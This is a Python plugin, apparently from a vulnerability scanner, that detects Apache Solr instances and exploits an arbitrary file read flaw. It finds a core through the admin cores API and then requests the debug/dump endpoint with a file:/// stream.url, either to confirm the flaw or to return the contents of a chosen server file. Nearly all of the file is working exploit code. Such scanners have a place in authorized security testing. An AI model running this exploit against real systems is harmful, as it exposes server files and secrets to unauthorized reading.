# -*- coding:utf-8 -*-
# Apache Solr 任意文件读取

from .. import requestUtil
from ServiceScanModel.models import ServiceScan


def solr_file_poc(url, db="", filename="passerW.txt", type="poc"):
    try:
        if db == "":
            resp = requestUtil.get(url + "/solr/admin/cores?_=1626521816720&indexInfo=false&wt=json").json()
            db = list(resp["status"].keys())[0]
        resp = requestUtil.get(url + "/solr/%s/debug/dump?param=ContentStreams&stream.url=file:///%s" % (db, filename))
        if type == "poc":
            if "No such file or directory" in resp.text:
                return db
            else:
                return False
        else:
            resp = resp.json()
            return resp["streams"][0]["stream"]
    except Exception as e:
        print(e)
        return ""


def fingerprint(service):
    try:
        if "solr" in service.title.lower():
            return True
    except:
        return False


def poc(service: ServiceScan):
    try:
        result = solr_file_poc(service.url)
        if result:
            print((["Apache Solr 任意文件读取", "可用应用: %s" % result], result))
            return (["Apache Solr 任意文件读取", "可用应用: %s" % result], result)
    except:
        return []
